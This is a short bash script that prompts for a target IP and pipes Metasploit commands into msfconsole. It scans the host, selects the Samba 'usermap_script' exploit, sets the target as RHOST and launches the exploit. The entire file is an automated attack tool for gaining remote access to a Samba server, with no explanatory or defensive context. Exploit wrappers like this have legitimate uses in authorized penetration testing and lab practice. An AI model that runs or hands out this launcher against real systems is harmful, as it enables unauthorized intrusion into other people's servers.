#!/bin/bash

echo "Enter target IP:"
read target

(
echo ""
sleep 1
echo "nmap -sn $target"
sleep 1
echo "search name:samba type:exploit platform:unix"
sleep 1
echo "use exploit/multi/samba/usermap_script"
sleep 1
echo "options"
sleep 1
echo "set RHOST $target"
sleep 1
echo "options"
sleep 1
echo "exploit"
sleep 1
) | msfconsole
